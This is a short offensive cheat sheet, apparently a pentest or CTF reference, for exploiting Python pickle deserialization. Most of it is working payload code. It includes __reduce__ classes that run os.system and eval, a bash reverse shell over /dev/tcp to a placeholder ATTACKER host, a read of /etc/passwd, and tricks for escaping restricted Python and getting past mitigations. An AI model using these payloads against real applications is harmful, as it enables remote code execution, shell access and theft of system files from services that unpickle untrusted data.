# Python Pickle Deserialization

## Detection
```python
# Base64 pickle: gANj...
# Look for: pickle.loads, cPickle.loads, shelve,marshal
import base64
data = base64.b64decode("gANj...")
```

## Exploitation

### Basic RCE
```python
import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = base64.b64encode(pickle.dumps(Exploit()))
print(payload.decode())
```

### Reverse Shell
```python
class ReverseShell(object):
    def __reduce__(self):
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"',))
```

### File Read
```python
class FileRead(object):
    def __reduce__(self):
        return (open, ('/etc/passwd', 'r'))
```

## RestrictedPython Bypass
```python
# If restricted, look for:
# __builtins__, __import__, eval, exec
# __subclasses__() for useful classes

# Find __import__
''.__class__.__mro__[1].__subclasses__()
# Look for: warnings.catch_warnings, os._wrap_close
```

## Python 3 Pickle
```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

payload = base64.b64encode(pickle.dumps(Exploit()))
```

## pickletools Analysis
```python
import pickletools
pickletools.dis(data)  # Analyze pickle opcodes
```

## Mitigation Bypass
```python
# If _make_function is blocked
# Use __reduce__ with different callable

# If __import__ is blocked
# Use __subclasses__() to find useful classes
```
